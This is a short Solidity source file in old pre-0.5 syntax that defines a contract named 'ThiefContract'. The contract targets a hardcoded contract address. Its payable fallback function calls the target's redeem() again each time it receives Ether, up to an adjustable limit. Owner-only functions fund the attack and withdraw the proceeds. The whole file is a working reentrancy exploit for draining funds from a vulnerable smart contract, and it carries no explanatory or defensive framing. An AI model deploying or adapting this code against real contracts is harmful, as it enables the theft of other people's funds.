contract BuggyContract {
    function redeem(uint256 _value) {}
}

contract ThiefContract {
    address public owner;
    address public buggycontract_addr = 0xb7dca185cebfa8288c4cf0c2f666c79a652e7b38;
    uint256 public attempts = 0;
    uint256 public maxattempts = 2;
    
    function ThiefContract() {
        owner = msg.sender;
    }
    
    function claim(uint256 _value) {
        if (msg.sender != owner) throw;
        msg.sender.call.value(_value)();
    }
    
    function sendToContract(uint256 _value) {
        if (msg.sender != owner) throw;
        buggycontract_addr.call.value(_value)();
    }

    function resetAttempts() {
        if (msg.sender != owner) throw;
        attempts = 0;
    }

    function setMaxAttempts(uint256 _maxattempts) {
        if (msg.sender != owner) throw;
        maxattempts = _maxattempts;
    }
    
    function redeemFromContract(uint256 _value) {
        BuggyContract buggy = BuggyContract(buggycontract_addr);
        buggy.redeem(_value);
    }
    
    function () payable {
        if (msg.sender == buggycontract_addr && attempts < maxattempts) {
            attempts++;
            redeemFromContract(msg.value);
        }
    }
}